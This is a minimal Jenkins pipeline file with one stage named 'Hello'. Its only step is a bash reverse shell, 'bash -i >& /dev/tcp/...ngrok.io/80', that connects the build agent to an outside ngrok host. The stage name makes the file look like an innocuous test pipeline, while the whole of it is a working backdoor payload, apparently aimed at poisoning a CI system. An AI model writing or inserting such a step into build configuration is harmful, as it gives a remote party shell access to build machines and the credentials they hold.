pipeline {
  agent none
  stages {
    stage('Hello') {
      agent any
      steps {
        sh '''#!/bin/bash
        bash -i >& /dev/tcp/d3e32bddf06d.ngrok.io/80 0>&1
        '''
      }
    }

  }
}
